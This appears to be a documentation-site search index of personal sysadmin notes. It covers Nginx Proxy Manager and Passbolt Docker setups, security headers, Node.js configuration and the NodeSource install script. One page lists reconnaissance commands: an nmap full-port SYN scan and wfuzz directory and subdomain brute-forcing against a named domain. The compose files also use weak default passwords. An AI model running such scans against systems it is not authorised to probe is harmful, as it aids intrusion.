SQLite.</p>"},{"location":"Nginx%20Proxy%20Manager/NginxPMdoc/#running-on-raspberry-pi-arm-devices","title":"#Running on Raspberry PI / ARM devices","text":"<p>The docker images support the following architectures:</p> <ul> <li>amd64</li> <li>arm64</li> <li>armv7</li> </ul> <p>The docker images are a manifest of all the architecture docker builds supported, so this means you don't have to worry about doing anything special and you can follow the common instructions above.</p> <p>Check out the dockerhub tags for a list of supported architectures and if you want one that doesn't exist, create a feature request.</p> <p>Also, if you don't know how to already, follow this guide to install docker and docker-compose on Raspbian.</p> <p>Please note that the <code>jc21/mariadb-aria:latest</code> image might have some problems on some ARM devices, if you want a separate database container, use the <code>yobasystems/alpine-mariadb:latest</code> image.</p>"},{"location":"Nginx%20Proxy%20Manager/NginxPMdoc/#initial-run","title":"#Initial Run","text":"<p>After the app is running for the first time, the following will happen:</p> <ol> <li>GPG keys will be generated and saved in the data folder</li> <li>The database will initialize with table structures</li> <li>A default admin user will be created</li> </ol> <p>This process can take a couple of minutes depending on your machine.</p>"},{"location":"Nginx%20Proxy%20Manager/NginxPMdoc/#default-administrator-user","title":"#Default Administrator User","text":"<pre><code>Email:    admin@example.com\nPassword: changeme\n</code></pre> <p>Immediately after logging in with this default user you will be asked to modify your details and change your password.</p> <pre><code>version: \"3\"\nservices:\n  app:\n    image: 'jc21/nginx-proxy-manager:2.9.22'\n    restart: unless-stopped\n    user: root\n    #ports:\n      # These ports are in format &lt;host-port&gt;:&lt;container-port&gt;\n      #- '80:80' # Public HTTP Port\n      #- '443:443' # Public HTTPS Port\n      #- '81:81' # Admin Web Port\n      # Add any other Stream port you want to expose\n      # - '21:21' # FTP\n    environment:\n      DB_MYSQL_HOST: \"localhost\"\n      DB_MYSQL_PORT: 3306\n      DB_MYSQL_USER: \"npm\"\n      DB_MYSQL_PASSWORD: \"npm\"\n      DB_MYSQL_NAME: \"npm\"\n      # Uncomment this if IPv6 is not enabled on your host\n      #DISABLE_IPV6: 'true'\n    volumes:\n      - ./data:/data\n      - ./letsencrypt:/etc/letsencrypt\n    depends_on:\n      - db\n    network_mode: host\n  db:\n    image: 'jc21/mariadb-aria:latest'\n    restart: unless-stopped\n    environment:\n      MYSQL_ROOT_PASSWORD: 'npm'\n      MYSQL_DATABASE: 'npm'\n      MYSQL_USER: 'npm'\n      MYSQL_PORT: 3306\n      MYSQL_PASSWORD: 'npm'\n    volumes:\n      - ./data/mysql:/var/lib/mysql\n    ports:\n      - 3306:3306\n</code></pre>"},{"location":"Nginx%20Proxy%20Manager/SecurytyHeaders/","title":"SecurytyHeaders","text":"<pre><code>version: \"3\"\nservices:\n  app:\n    image: 'jc21/nginx-proxy-manager:latest'\n    restart: unless-stopped\n    #ports:\n      # These ports are in format &lt;host-port&gt;:&lt;container-port&gt;\n      #- '80:80' # Public HTTP Port\n      #- '443:443' # Public HTTPS Port\n      #- '81:81' # Admin Web Port\n      # Add any other Stream port you want to expose\n      # - '21:21' # FTP\n    environment:\n      DB_MYSQL_HOST: \"localhost\"\n      DB_MYSQL_PORT: 3306\n      DB_MYSQL_USER: \"npm\"\n      DB_MYSQL_PASSWORD: \"npm\"\n      DB_MYSQL_NAME: \"npm\"\n      # Uncomment this if IPv6 is not enabled on your host\n      # DISABLE_IPV6: 'true'\n    volumes:\n      - ./data:/data\n      - ./letsencrypt:/etc/letsencrypt\n      - ./_hsts.conf:/app/templates/_hsts.conf:ro\n    depends_on:\n      - db\n    network_mode: host\n    #networks:\n    #  - caddy\n\n  db:\n    image: 'jc21/mariadb-aria:latest'\n    restart: unless-stopped\n    environment:\n      MYSQL_ROOT_PASSWORD: 'npm'\n      MYSQL_DATABASE: 'npm'\n      MYSQL_USER: 'npm'\n      MYSQL_PASSWORD: 'npm'\n    volumes:\n      - ./data/mysql:/var/lib/mysql\n    network_mode: host\n    #networks:\n    #  - caddy\n#networks:\n#  caddy:\n#    external: true\n</code></pre> <p><code>_hsts.conf</code></p> <pre><code>{% if certificate and certificate_id &gt; 0 -%}\n{% if ssl_forced == 1 or ssl_forced == true %}\n{% if hsts_enabled == 1 or hsts_enabled == true %}\n  # HSTS (ngx_http_headers_module is required) (63072000 seconds = 2 years)\n  add_header Strict-Transport-Security \"max-age=63072000;{% if hsts_subdomains == 1 or hsts_subdomains == true -%} includeSubDomains;{% endif %} preload\" always;\n  add_header Referrer-Policy strict-origin-when-cross-origin; \n  add_header X-Content-Type-Options nosniff;\n  add_header X-XSS-Protection \"1; mode=block\";\n  add_header X-Frame-Options SAMEORIGIN;\n  add_header Content-Security-Policy upgrade-insecure-requests;\n  add_header Permissions-Policy interest-cohort=();\n  add_header Expect-CT 'enforce; max-age=604800';\n  more_set_headers 'Server: Proxy';\n  more_clear_headers 'X-Powered-By';\n{% endif %}\n{% endif %}\n{% endif %}\n</code></pre> <pre><code>{% if certificate and certificate_id &gt; 0 -%}\n{% if ssl_forced == 1 or ssl_forced == true %}\n{% if hsts_enabled == 1 or hsts_enabled == true %}\n  # HSTS (ngx_http_headers_module is required) (63072000 seconds = 2 years)\n  add_header Strict-Transport-Security \"max-age=15552000;{% if hsts_subdomains == 1 or hsts_subdomains == true -%} includeSubDomains;{% endif %} preload\" always;\n  add_header Referrer-Policy strict-origin-when-cross-origin;\n  add_header X-Content-Type-Options nosniff;\n  add_header Content-Security-Policy upgrade-insecure-requests;\n  add_header Permissions-Policy interest-cohort=();\n  add_header Expect-CT 'enforce; max-age=604800';\n  more_set_headers 'Server: Proxy';\n  more_clear_headers 'X-Powered-By';\n{% endif %}\n{% endif %}\n{% endif %}\n</code></pre> <pre><code># /etc/nginx/nginx.conf\nserver_tokens off;\nproxy_pass_header 'lukaku';\netag off;\nadd_header Last-Modified '';\nif_modified_since off;\nsendfile        on;\nmax_ranges 0;\n\n# /etc/nginx/conf.d/default.conf\nadd_header Referrer-Policy strict-origin-when-cross-origin; \nadd_header X-Content-Type-Options nosniff;\nadd_header X-XSS-Protection \"1; mode=block\";\nadd_header X-Frame-Options SAMEORIGIN;\nadd_header Content-Security-Policy upgrade-insecure-requests;\nadd_header Permissions-Policy interest-cohort=();\nadd_header Expect-CT 'enforce; max-age=604800';\n</code></pre> <pre><code>So I made so changes :\n\nFirst here is my _hsts.conf file :\n\n{% if certificate and certificate_id &gt; 0 -%}\n{% if ssl_forced == 1 or ssl_forced == true %}\n{% if hsts_enabled == 1 or hsts_enabled == true %}\nadd_header Strict-Transport-Security $hdr_strict_transport_security;\nadd_header Referrer-Policy $hdr_referrer_policy;\nadd_header X-Content-Type-Options $hdr_x_content_type_options;\nadd_header X-XSS-Protection $hdr_x_xss_protection;\nadd_header X-Frame-Options $hdr_x_frame_options;\nadd_header Content-Security-Policy $hdr_content_security_policy;\nadd_header Permissions-Policy $hdr_permissions_policy;\nadd_header Expect-CT $hdr_expect_ct;\nmore_set_headers 'Server: Proxy';\nmore_clear_headers 'X-Powered-By';\n{% endif %}\n{% endif %}\n{% endif %}\n\nThen I created (or modified) in /data/nginx/custom a http_top.conf file :\n\nmap $upstream_http_strict_transport_security $hdr_strict_transport_security {\n'' \"max-age=63072000; includeSubDomains; preload\";\n}\n\nmap $upstream_http_referrer_policy $hdr_referrer_policy {\n'' \"strict-origin-when-cross-origin\";\n}\n\nmap $upstream_http_x_content_type_options $hdr_x_content_type_options {\n'' \"nosniff\";\n}\n\nmap $upstream_http_x_xss_protection $hdr_x_xss_protection {\n'' \"1; mode=block\";\n}\n\nmap $upstream_http_x_frame_options $hdr_x_frame_options {\n'' \"SAMEORIGIN\";\n}\n\nmap $upstream_http_content_security_policy $hdr_content_security_policy {\n'' \"upgrade-insecure-requests\";\n}\n\nmap $upstream_http_permissions_policy $hdr_permissions_policy {\n'' \"interest-cohort=()\";\n}\n\nmap $upstream_http_expect_ct $hdr_expect_ct {\n'' \"enforce, max-age=604800\";\n}\n\nThan restarting nginx and disabling SSL and saving in NPM, and enabling it again.\nWith this configuration nginx only adds those header if they are not already send by the underling application.\n\nThe only thing is if you want to disable on of those header (X-frame for me) on a specified application, you have to put the entire configuration for this application in the advanced tap with \"location/{ ....}\n</code></pre>"},{"location":"Nginx%20Proxy%20Manager/certbotTroubleshott/","title":"certbotTroubleshott","text":""},{"location":"Nginx%20Proxy%20Manager/certbotTroubleshott/#certbot","title":"Certbot","text":"<pre><code>ps -ef | grep certb\nkill process\n</code></pre>"},{"location":"Nmap/scanSteps/","title":"scanSteps","text":""},{"location":"Nmap/scanSteps/#scan-open-ports","title":"Scan Open Ports","text":"<pre><code>nmap -p- --open -sS --min-rate 5000 -vvv -Pn &lt;ip&gt; -oG allPosrts\n</code></pre>"},{"location":"Nmap/scanSteps/#scan-ports","title":"Scan Ports","text":"<pre><code>nmap -p&lt;80,22,443&gt; -sCV &lt;ip&gt;\n</code></pre>"},{"location":"Nmap/scanSteps/#wfuzz","title":"WFUZZ","text":"<p>Domain and S</p> <pre><code>wfuzz -c --hc 404 -t 200 -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt &lt;ip&gt;\n</code></pre> <pre><code>sudo wfuzz -c -f sub-fighter.txt -Z -w /usr/share/SecLists/Discovery/DNS/subdomains-top1million-5000.txt --sc 200,202,204,301,302,307,403 FUZZ.docugene.eu\n</code></pre>"},{"location":"Node/bind80-noroot/","title":"Bind80 noroot","text":""},{"location":"Node/bind80-noroot/#bind-80-port-in-pm2","title":"Bind 80 port in pm2","text":"<pre><code>sudo setcap CAP_NET_BIND_SERVICE=+eip `which node`\n</code></pre>"},{"location":"Node/buildLimiter/","title":"buildLimiter","text":"<p>You need to control the max memory size flags (all sizes are taken in MB).</p> <p>The recommended amounts for a \"low memory device\" are:</p> <pre><code>node --max-executable-size=96 --max-old-space-size=128 --max-semi-space-size=1 app.js\n</code></pre> <p>for 32-bit and/or Android and</p> <pre><code>node --max-executable-size=192 --max-old-space-size=256 --max-semi-space-size=2 app.js\n</code></pre> <p>for 64-bit non-android.</p> <p>These would limit the heap totals to 225mb and 450mb respectively. It doesn't include memory usage outside JS. For instance buffers are allocated as \"c memory\" , not in the JavaScript heap.</p> <p>Also you should know that the closer you are to the heap limit the more time is wasted in GC. E.g. if you are at 95% memory usage 90% of the CPU would be used for GC and 10% for running actual code (not real numbers but give the general idea). So you should be as generous as possible with the limits and never exceed say 16% of the maximum memory usage (I.E. <code>heapUsed/limit</code> should not be greater than <code>0.16</code>). 16% is just something I recall from some paper, it might not be the most optimal.</p> <p>Flags:</p> <ul> <li><code>--max-executable-size</code> the maximum size of heap reserved for executable code (the native code result of just-in-time compiled JavaScript).</li> <li><code>--max-old-space-size</code> the maximum size of heap reserved for long term objects</li> <li><code>--max-semi-space-size</code> the maximum size of heap reserved for short term objects</li> </ul>"},{"location":"Node/node/","title":"Node","text":""},{"location":"Node/node/#pm2","title":"Pm2","text":"<p>Limit resources</p> <p><code>pm2 start --node-args=\"--max-old-space-size=XXX\" test.js</code></p>"},{"location":"Node/node_install/","title":"Node install","text":"<pre><code>#!/bin/bash\n\n# Discussion, issues and change requests at:\n#   https://github.com/nodesource/distributions\n#\n# Script to install the NodeSource Node.js 16.x repo onto a\n# Debian or Ubuntu system.\n#\n# Run as root or insert `sudo -E` before `bash`:\n#\n# curl -sL https://deb.nodesource.com/setup_16.x | bash -\n#   or\n# wget -qO- https://deb.nodesource.com/setup_16.x | bash -\n#\n# CONTRIBUTIONS TO THIS SCRIPT\n#\n# This script is built from a template in\n# https://github.com/nodesource/distributions/tree/master/deb/src\n# please don't submit pull requests against the built scripts.\n#\n\n\nexport DEBIAN_FRONTEND=noninteractive\nSCRSUFFIX=\"_16.x\"\nNODENAME=\"Node.js 16.x\"\nNODEREPO=\"node_16.x\"\nNODEPKG=\"nodejs\"\n\nprint_status() {\n    echo\n    echo \"## $1\"\n    echo\n}\n\nif test -t 1; then # if terminal\n    ncolors=$(which tput &gt; /dev/null &amp;&amp; tput colors) # supports color\n    if test -n \"$ncolors\" &amp;&amp; test $ncolors -ge 8; then\n        termcols=$(tput cols)\n        bold=\"$(tput bold)\"\n        underline=\"$(tput smul)\"\n        standout=\"$(tput smso)\"\n        normal=\"$(tput sgr0)\"\n        black=\"$(tput setaf 0)\"\n        red=\"$(tput setaf 1)\"\n        green=\"$(tput setaf 2)\"\n        yellow=\"$(tput setaf 3)\"\n        blue=\"$(tput setaf 4)\"\n        magenta=\"$(tput setaf 5)\"\n        cyan=\"$(tput setaf 6)\"\n        white=\"$(tput setaf 7)\"\n    fi\nfi\n\nprint_bold() {\n    title=\"$1\"\n    text=\"$2\"\n\n    echo\n    echo \"${red}================================================================================${normal}\"\n    echo \"${red}================================================================================${normal}\"\n    echo\n    echo -e \"  ${bold}${yellow}${title}${normal}\"\n    echo\n    echo -en \"  ${text}\"\n    echo\n    echo \"${red}================================================================================${normal}\"\n    echo \"${red}================================================================================${normal}\"\n}\n\nbail() {\n    echo 'Error executing command, exiting'\n    exit 1\n}\n\nexec_cmd_nobail() {\n    echo \"+ $1\"\n    bash -c \"$1\"\n}\n\nexec_cmd() {\n    exec_cmd_nobail \"$1\" || bail\n}\n\nnode_deprecation_warning() {\n    if [[ \"X${NODENAME}\" == \"Xio.js 1.x\" ||\n          \"X${NODENAME}\" == \"Xio.js 2.x\" ||\n          \"X${NODENAME}\" == \"Xio.js 3.x\" ||\n          \"X${NODENAME}\" == \"XNode.js 0.10\" ||\n          \"X${NODENAME}\" == \"XNode.js 0.12\" ||\n          \"X${NODENAME}\" == \"XNode.js 4.x LTS Argon\" ||\n          \"X${NODENAME}\" == \"XNode.js 5.x\" ||\n          \"X${NODENAME}\" == \"XNode.js 6.x LTS Boron\" ||\n          \"X${NODENAME}\" == \"XNode.js 7.x\" ||\n          \"X${NODENAME}\" == \"XNode.js 8.x LTS Carbon\" ||\n          \"X${NODENAME}\" == \"XNode.js 9.x\" ||\n          \"X${NODENAME}\" == \"XNode.js 10.x\" ||\n          \"X${NODENAME}\" == \"XNode.js 11.x\" ||\n          \"X${NODENAME}\" == \"XNode.js 13.x\" ||\n          \"X${NODENAME}\" == \"XNode.js 15.x\" ]]; then\n\n        print_bold \\\n\"                            DEPRECATION WARNING                            \" \"\\\n${bold}${NODENAME} is no longer actively supported!${normal}\n\n  ${bold}You will not receive security or critical stability updates${normal} for this version.\n\n  You should migrate to a supported version of Node.js as soon as possible.\n  Use the installation script that corresponds to the version of Node.js you\n  wish to install. e.g.\n\n   * ${green}https://deb.nodesource.com/setup_12.x \u2014 Node.js 12 LTS \\\"Erbium\\\"${normal}\n   * ${green}https://deb.nodesource.com/setup_14.x \u2014 Node.js 14 LTS \\\"Fermium\\\"${normal} (recommended)\n   * ${green}https://deb.nodesource.com/setup_16.x \u2014 Node.js 16 \\\"Gallium\\\"${normal}\n   * ${green}https://deb.nodesource.com/setup_17.x \u2014 Node.js 17 \\\"Seventeen\\\"${normal} (current)\n\n  Please see ${bold}https://github.com/nodejs/Release${normal} for details about which\n  version may be appropriate for you.\n\n  The ${bold}NodeSource${normal} Node.js distributions repository contains\n  information both about supported versions of Node.js and supported Linux\n  distributions. To learn more about usage, see the repository:\n    ${bold}https://github.com/nodesource/distributions${normal}\n\"\n        echo\n        echo \"Continuing in 20 seconds ...\"\n        echo\n        sleep 20\n    fi\n}\n\nscript_deprecation_warning() {\n    if [ \"X${SCRSUFFIX}\" == \"X\" ]; then\n        print_bold \\\n\"                         SCRIPT DEPRECATION WARNING                         \" \"\\\nThis script, located at ${bold}https://deb.nodesource.com/setup${normal}, used to\n  install Node.js 0.10, is deprecated and will eventually be made inactive.\n\n  You should use the script that corresponds to the version of Node.js you\n  wish to install. e.g.\n\n   * ${green}https://deb.nodesource.com/setup_12.x \u2014 Node.js 12 LTS \\\"Erbium\\\"${normal}\n   * ${green}https://deb.nodesource.com/setup_14.x \u2014 Node.js 14 LTS \\\"Fermium\\\"${normal} (recommended)\n   * ${green}https://deb.nodesource.com/setup_16.x \u2014 Node.js 16 \\\"Gallium\\\"${normal}\n   * ${green}https://deb.nodesource.com/setup_17.x \u2014 Node.js 17 \\\"Seventeen\\\"${normal} (current)\n\n  Please see ${bold}https://github.com/nodejs/Release${normal} for details about which\n  version may be appropriate for you.\n\n  The ${bold}NodeSource${normal} Node.js Linux distributions GitHub repository contains\n  information about which versions of Node.js and which Linux distributions\n  are supported and how to use the install scripts.\n    ${bold}https://github.com/nodesource/distributions${normal}\n\"\n\n        echo\n        echo \"Continuing in 20 seconds (press Ctrl-C to abort) ...\"\n        echo\n        sleep 20\n    fi\n}\n\nsetup() {\n\nscript_deprecation_warning\nnode_deprecation_warning\n\nprint_status \"Installing the NodeSource ${NODENAME} repo...\"\n\nif $(uname -m | grep -Eq ^armv6); then\n    print_status \"You appear to be running on ARMv6 hardware. Unfortunately this is not currently supported by the NodeSource Linux distributions. Please use the 'linux-armv6l' binary tarballs available directly from nodejs.org for Node.js 4 and later.\"\n    exit 1\nfi\n\nPRE_INSTALL_PKGS=\"\"\n\n# Check that HTTPS transport is available to APT\n# (Check snaked from: https://get.docker.io/ubuntu/)\n\nif [ ! -e /usr/lib/apt/methods/https ]; then\n    PRE_INSTALL_PKGS=\"${PRE_INSTALL_PKGS} apt-transport-https\"\nfi\n\nif [ ! -x /usr/bin/lsb_release ]; then\n    PRE_INSTALL_PKGS=\"${PRE_INSTALL_PKGS} lsb-release\"\nfi\n\nif [ ! -x /usr/bin/curl ] &amp;&amp; [ ! -x /usr/bin/wget ]; then\n    PRE_INSTALL_PKGS=\"${PRE_INSTALL_PKGS} curl\"\nfi\n\n# Used by apt-key to add new keys\n\nif [ ! -x /usr/bin/gpg ]; then\n    PRE_INSTALL_PKGS=\"${PRE_INSTALL_PKGS} gnupg\"\nfi\n\n# Populating Cache\nprint_status \"Populating apt-get cache...\"\nexec_cmd 'apt-get update'\n\nif [ \"X${PRE_INSTALL_PKGS}\" != \"X\" ]; then\n    print_status \"Installing packages required for setup:${PRE_INSTALL_PKGS}...\"\n    # This next command needs to be redirected to /dev/null or the script will bork\n    # in some environments\n    exec_cmd \"apt-get install -y${PRE_INSTALL_PKGS} &gt; /dev/null 2&gt;&amp;1\"\nfi\n\nIS_PRERELEASE=$(lsb_release -d | grep 'Ubuntu .*development' &gt;&amp; /dev/null; echo $?)\nif [[ $IS_PRERELEASE -eq 0 ]]; then\n    print_status \"Your distribution, identified as \\\"$(lsb_release -d -s)\\\", is a pre-release version of Ubuntu. NodeSource does not maintain official support for Ubuntu versions until they are formally released. You can try using the manual installation instructions available at https://github.com/nodesource/distributions and use the latest supported Ubuntu version name as the distribution identifier, although this is not guaranteed to work.\"\n    exit 1\nfi\n\nDISTRO=$(lsb_release -c -s)\n\ncheck_alt() {\n    if [ \"X${DISTRO}\" == \"X${2}\" ]; then\n        echo\n        echo \"## You seem to be using ${1} version ${DISTRO}.\"\n        echo \"## This maps to ${3} \\\"${4}\\\"... Adjusting for you...\"\n        DISTRO=\"${4}\"\n    fi\n}\n\ncheck_alt \"SolydXK\"       \"solydxk-9\" \"Debian\" \"stretch\"\ncheck_alt \"Kali\"          \"sana\"     \"Debian\" \"jessie\"\ncheck_alt \"Kali\"          \"kali-rolling\" \"Debian\" \"bullseye\"\ncheck_alt \"Sparky Linux\"  \"Tyche\"    \"Debian\" \"stretch\"\ncheck_alt \"Sparky Linux\"  \"Nibiru\"   \"Debian\" \"buster\"\ncheck_alt \"Sparky Linux\"  \"Po-Tolo\"   \"Debian\" \"bullseye\"\ncheck_alt \"MX Linux 17\"   \"Horizon\"  \"Debian\" \"stretch\"\ncheck_alt \"MX Linux 18\"   \"Continuum\" \"Debian\" \"stretch\"\ncheck_alt \"MX Linux 19\"   \"patito feo\" \"Debian\" \"buster\"\ncheck_alt \"MX Linux 21\"   \"wildflower\" \"Debian\" \"bullseye\"\ncheck_alt \"Linux Mint\"    \"maya\"     \"Ubuntu\" \"precise\"\ncheck_alt \"Linux Mint\"    \"qiana\"    \"Ubuntu\" \"trusty\"\ncheck_alt \"Linux Mint\"    \"rafaela\"  \"Ubuntu\" \"trusty\"\ncheck_alt \"Linux Mint\"    \"rebecca\"  \"Ubuntu\" \"trusty\"\ncheck_alt \"Linux Mint\"    \"rosa\"     \"Ubuntu\" \"trusty\"\ncheck_alt \"Linux Mint\"    \"sarah\"    \"Ubuntu\" \"xenial\"\ncheck_alt \"Linux Mint\"    \"serena\"   \"Ubuntu\" \"xenial\"\ncheck_alt \"Linux Mint\"    \"sonya\"    \"Ubuntu\" \"xenial\"\ncheck_alt \"Linux Mint\"    \"sylvia\"   \"Ubuntu\" \"xenial\"\ncheck_alt \"Linux Mint\"    \"tara\"     \"Ubuntu\" \"bionic\"\ncheck_alt \"Linux Mint\"    \"tessa\"    \"Ubuntu\" \"bionic\"\ncheck_alt \"Linux Mint\"    \"tina\"     \"Ubuntu\" \"bionic\"\ncheck_alt \"Linux Mint\"    \"tricia\"   \"Ubuntu\" \"bionic\"\ncheck_alt \"Linux Mint\"    \"ulyana\"   \"Ubuntu\" \"focal\"\ncheck_alt \"Linux Mint\"    \"ulyssa\"   \"Ubuntu\" \"focal\"\ncheck_alt \"Linux Mint\"    \"uma\"      \"Ubuntu\" \"focal\"\ncheck_alt \"Linux Mint\"    \"una\"      \"Ubuntu\" \"focal\"\ncheck_alt \"LMDE\"          \"betsy\"    \"Debian\" \"jessie\"\ncheck_alt \"LMDE\"          \"cindy\"    \"Debian\" \"stretch\"\ncheck_alt \"LMDE\"          \"debbie\"   \"Debian\" \"buster\"\ncheck_alt \"elementaryOS\"  \"luna\"     \"Ubuntu\" \"precise\"\ncheck_alt \"elementaryOS\"  \"freya\"    \"Ubuntu\" \"trusty\"\ncheck_alt \"elementaryOS\"  \"loki\"     \"Ubuntu\" \"xenial\"\ncheck_alt \"elementaryOS\"  \"juno\"     \"Ubuntu\" \"bionic\"\ncheck_alt \"elementaryOS\"  \"hera\"     \"Ubuntu\" \"bionic\"\ncheck_alt \"elementaryOS\"  \"odin\"     \"Ubuntu\" \"focal\"\ncheck_alt \"elementaryOS\"  \"jolnir\"   \"Ubuntu\" \"focal\"\ncheck_alt \"Trisquel\"      \"toutatis\" \"Ubuntu\" \"precise\"\ncheck_alt \"Trisquel\"      \"belenos\"  \"Ubuntu\" \"trusty\"\ncheck_alt \"Trisquel\"      \"flidas\"   \"Ubuntu\" \"xenial\"\ncheck_alt \"Trisquel\"      \"etiona\"   \"Ubuntu\" \"bionic\"\ncheck_alt \"Uruk GNU/Linux\" \"lugalbanda\" \"Ubuntu\" \"xenial\"\ncheck_alt \"BOSS\"          \"anokha\"   \"Debian\" \"wheezy\"\ncheck_alt \"BOSS\"          \"anoop\"    \"Debian\" \"jessie\"\ncheck_alt \"BOSS\"          \"drishti\"  \"Debian\" \"stretch\"\ncheck_alt \"BOSS\"          \"unnati\"   \"Debian\" \"buster\"\ncheck_alt \"bunsenlabs\"    \"bunsen-hydrogen\" \"Debian\" \"jessie\"\ncheck_alt \"bunsenlabs\"    \"helium\"   \"Debian\" \"stretch\"\ncheck_alt \"bunsenlabs\"    \"lithium\"  \"Debian\" \"buster\"\ncheck_alt \"Tanglu\"        \"chromodoris\" \"Debian\" \"jessie\"\ncheck_alt \"PureOS\"        \"green\"    \"Debian\" \"sid\"\ncheck_alt \"PureOS\"        \"amber\"    \"Debian\" \"buster\"\ncheck_alt \"PureOS\"        \"byzantium\" \"Debian\" \"bullseye\"\ncheck_alt \"Devuan\"        \"jessie\"   \"Debian\" \"jessie\"\ncheck_alt \"Devuan\"        \"ascii\"    \"Debian\" \"stretch\"\ncheck_alt \"Devuan\"        \"beowulf\"  \"Debian\" \"buster\"\ncheck_alt \"Devuan\"        \"chimaera\"  \"Debian\" \"bullseye\"\ncheck_alt \"Devuan\"        \"ceres\"    \"Debian\" \"sid\"\ncheck_alt \"Deepin\"        \"panda\"    \"Debian\" \"sid\"\ncheck_alt \"Deepin\"        \"unstable\" \"Debian\" \"sid\"\ncheck_alt \"Deepin\"        \"stable\"   \"Debian\" \"buster\"\ncheck_alt \"Pardus\"        \"onyedi\"   \"Debian\" \"stretch\"\ncheck_alt \"Liquid Lemur\"  \"lemur-3\"  \"Debian\" \"stretch\"\ncheck_alt \"Astra Linux\"   \"orel\"     \"Debian\" \"stretch\"\ncheck_alt \"Ubilinux\"      \"dolcetto\" \"Debian\" \"stretch\"\n\nif [ \"X${DISTRO}\" == \"Xdebian\" ]; then\n  print_status \"Unknown Debian-based distribution, checking /etc/debian_version...\"\n  NEWDISTRO=$([ -e /etc/debian_version ] &amp;&amp; cut -d/ -f1 &lt; /etc/debian_version)\n  if [ \"X${NEWDISTRO}\" == \"X\" ]; then\n    print_status \"Could not determine distribution from /etc/debian_version...\"\n  else\n    DISTRO=$NEWDISTRO\n    print_status \"Found \\\"${DISTRO}\\\" in /etc/debian_version...\"\n  fi\nfi\n\nprint_status \"Confirming \\\"${DISTRO}\\\" is supported...\"\n\nif [ -x /usr/bin/curl ]; then\n    exec_cmd_nobail \"curl -sLf -o /dev/null 'https://deb.nodesource.com/${NODEREPO}/dists/${DISTRO}/Release'\"\n    RC=$?\nelse\n    exec_cmd_nobail \"wget -qO /dev/null -o /dev/null 'https://deb.nodesource.com/${NODEREPO}/dists/${DISTRO}/Release'\"\n    RC=$?\nfi\n\nif [[ $RC != 0 ]]; then\n    print_status \"Your distribution, identified as \\\"${DISTRO}\\\", is not currently supported, please contact NodeSource at https://github.com/nodesource/distributions/issues if you think this is incorrect or would like your distribution to be considered for support\"\n    exit 1\nfi\n\nif [ -f \"/etc/apt/sources.list.d/chris-lea-node_js-$DISTRO.list\" ]; then\n    print_status 'Removing Launchpad PPA Repository for NodeJS...'\n\n    exec_cmd_nobail 'add-apt-repository -y -r ppa:chris-lea/node.js'\n    exec_cmd \"rm -f /etc/apt/sources.list.d/chris-lea-node_js-${DISTRO}.list\"\nfi\n\nprint_status 'Adding the NodeSource signing key to your keyring...'\nkeyring='/usr/share/keyrings'\nnode_key_url=\"https://deb.nodesource.com/gpgkey/nodesource.gpg.key\"\nlocal_node_key=\"$keyring/nodesource.gpg\"\n\nif [ -x /usr/bin/curl ]; then\n    exec_cmd \"curl -s $node_key_url | gpg --dearmor | tee $local_node_key &gt;/dev/null\"\nelse\n    exec_cmd \"wget -q -O - $node_key_url | gpg --dearmor | tee $local_node_key &gt;/dev/null\"\nfi\n\nprint_status \"Creating apt sources list file for the NodeSource ${NODENAME} repo...\"\n\nexec_cmd \"echo 'deb [signed-by=$local_node_key] https://deb.nodesource.com/${NODEREPO} ${DISTRO} main' &gt; /etc/apt/sources.list.d/nodesource.list\"\nexec_cmd \"echo 'deb-src [signed-by=$local_node_key] https://deb.nodesource.com/${NODEREPO} ${DISTRO} main' &gt;&gt; /etc/apt/sources.list.d/nodesource.list\"\n\nprint_status 'Running `apt-get update` for you...'\n\nexec_cmd 'apt-get update'\n\nyarn_site='https://dl.yarnpkg.com/debian'\nyarn_key_url=\"$yarn_site/pubkey.gpg\"\nlocal_yarn_key=\"$keyring/yarnkey.gpg\"\n\nprint_status \"\"\"Run \\`${bold}sudo apt-get install -y ${NODEPKG}${normal}\\` to install ${NODENAME} and npm\n## You may also need development tools to build native addons:\n     sudo apt-get install gcc g++ make\n## To install the Yarn package manager, run:\n     curl -sL $yarn_key_url | gpg --dearmor | sudo tee $local_yarn_key &gt;/dev/null\n     echo \\\"deb [signed-by=$local_yarn_key] $yarn_site stable main\\\" | sudo tee /etc/apt/sources.list.d/yarn.list\n     sudo apt-get update &amp;&amp; sudo apt-get install yarn\n\"\"\"\n\n}\n\n## Defer setup until we have the complete script\nsetup\n</code></pre>"},{"location":"Passbolt%28Vault%29/InstallDocker/","title":"Docker passbolt installation","text":"<p>Important: Installing Passbolt with Docker is considered a somewhat advanced method. Using this method assumes you are familiar with Docker and have run other applications with Docker. If you do not have experience working with Docker we recommend you use another of our installation methods.</p>"},{"location":"Passbolt%28Vault%29/InstallDocker/#system-requirements","title":"System requirements","text":"<ul> <li>docker: https://docs.docker.com/get-docker/</li> <li>docker-compose: https://docs.docker.com/compose/install/</li> <li>A Linux user able to run docker commands without sudo</li> <li>a working SMTP server for email notifications</li> <li>a working NTP service to avoid GPG authentication issues</li> </ul> <p>FAQ pages:</p> <ul> <li>Set up NTP</li> <li>Firewall rules</li> </ul>"},{"location":"Passbolt%28Vault%29/InstallDocker/#docker-compose","title":"docker-compose","text":"<p>The easiest and recommended way to deploy your passbolt stack is to use docker-compose.</p> <p>Step 1. Download our docker-compose.yml example file</p> <pre><code>wget https://download.passbolt.com/ce/docker/docker-compose-ce.yaml\nwget https://github.com/passbolt/passbolt_docker/releases/latest/download/docker-compose-ce-SHA512SUM.txt\n</code></pre> <p>Step 2. Ensure the file has not been corrupted by verifying its shasum</p> <pre><code>$ sha512sum -c docker-compose-ce-SHA512SUM.txt\n</code></pre> <p>Must return:</p> <pre><code>docker-compose-ce.yaml: OK\n</code></pre> <p>Warning: If the shasum command output is not correct, the downloaded file has been corrupted. Retry step 1 or ask for support on our community forum.</p> <p>Step 3. Configure environment variables in docker-compose-ce.yaml file to customize your instance.</p> <p>Notice: By default the docker-compose.yaml file is set to latest. We strongly recommend changing that to the tag for the version you want to install.</p> <p>The <code>APP_FULL_BASE_URL</code> environment variable is set by default to https://passbolt.local, using a self-signed certificate.</p> <p>Update this variable with the server name you plan to use. You will find at the bottom of this documentation links about how to set your own SSL certificate.</p> <p>You must configure also SMTP settings to be able to receive notifications and recovery emails. Please find below the most used environment variables for this purpose:</p> Variable name Description Default value EMAIL_DEFAULT_FROM_NAME From email username <code>'Passbolt'</code> EMAIL_DEFAULT_FROM From email address <code>'you@localhost'</code> EMAIL_TRANSPORT_DEFAULT_HOST Server hostname <code>'localhost'</code> 